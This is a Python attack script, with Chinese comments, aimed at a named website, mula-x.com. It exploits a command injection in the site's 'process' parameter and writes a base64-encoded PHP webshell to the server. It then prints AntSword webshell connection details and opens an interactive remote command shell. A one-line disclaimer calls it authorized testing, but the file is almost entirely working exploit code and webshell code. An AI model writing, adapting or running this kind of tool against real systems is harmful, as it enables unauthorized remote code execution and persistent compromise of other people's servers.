#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MULA-X 简化连接工具
基于已验证的命令注入漏洞，提供简单的命令执行功能
仅用于授权的安全测试
"""

import requests
import urllib.parse
import sys

def execute_command(command):
    """执行系统命令"""
    base_url = "https://mula-x.com/"

    try:
        # 构造命令注入载荷
        payload = f";{command}"
        encoded_payload = urllib.parse.quote(payload)

        # 发送请求
        response = requests.get(
            f"{base_url}?process={encoded_payload}",
            timeout=10,
            verify=False
        )

        return {
            'success': True,
            'status_code': response.status_code,
            'content': response.text,
            'command': command
        }

    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'command': command
        }

def upload_webshell():
    """上传WebShell"""
    # WebShell PHP代码
    webshell_code = '''<?php
if(isset($_POST['cmd'])){
    echo "<pre>";
    $cmd = $_POST['cmd'];
    if(function_exists('system')){
        system($cmd);
    }elseif(function_exists('passthru')){
        passthru($cmd);
    }elseif(function_exists('shell_exec')){
        echo shell_exec($cmd);
    }
    echo "</pre>";
}
?>'''

    # Base64编码
    import base64
    encoded = base64.b64encode(webshell_code.encode()).decode()

    # 上传命令
    upload_cmd = f"echo {encoded} | base64 -d > /tmp/webshell.php"

    print("正在上传WebShell...")
    result = execute_command(upload_cmd)

    if result['success']:
        print("WebShell上传成功!")
        print("文件路径: /tmp/webshell.php")
        print("访问方式: POST参数 cmd")

        # 测试WebShell
        test_cmd = "php -r 'echo shell_exec(\"whoami\");'"
        test_result = execute_command(test_cmd)

        if test_result['success']:
            print("WebShell测试成功!")
            print(f"当前用户: {test_result['content'][:100]}")

        return "/tmp/webshell.php"
    else:
        print(f"WebShell上传失败: {result.get('error')}")
        return None

def main():
    """主函数"""
    print("MULA-X 简化连接工具")
    print("=" * 40)
    print("目标: https://mula-x.com/")
    print("漏洞: 命令注入")
    print("=" * 40)

    # 测试连接
    print("\n1. 测试连接...")
    test_result = execute_command("whoami")

    if test_result['success']:
        print("连接成功!")
        print(f"当前用户: {test_result['content'][:100]}")
    else:
        print(f"连接失败: {test_result.get('error')}")
        return

    # 上传WebShell
    print("\n2. 上传WebShell...")
    webshell_path = upload_webshell()

    if webshell_path:
        print(f"\n3. 蚁剑连接信息:")
        print(f"URL: https://mula-x.com/")
        print(f"参数名: process")
        print(f"参数值: ;php -r \"echo shell_exec('\\$_POST[\\'cmd\\']');\"")
        print(f"密码: cmd")
        print(f"类型: PHP Eval")

        print(f"\n4. 或者直接访问WebShell:")
        print(f"URL: https://mula-x.com/?process=;include '{webshell_path}';")
        print(f"方法: POST")
        print(f"参数: cmd=your_command")

    print("\n5. 交互式Shell (输入 exit 退出):")
    print("-" * 40)

    while True:
        try:
            command = input("[mula-x]$ ").strip()

            if command.lower() == 'exit':
                print("退出")
                break
            elif not command:
                continue

            result = execute_command(command)

            if result['success']:
                if 'content' in result and result['content']:
                    content = result['content']
                    if len(content) > 500:
                        print(f"输出: {content[:500]}...")
                    else:
                        print(f"输出: {content}")
            else:
                print(f"错误: {result.get('error')}")

        except KeyboardInterrupt:
            print("\n退出")
            break
        except Exception as e:
            print(f"错误: {e}")

if __name__ == "__main__":
    main()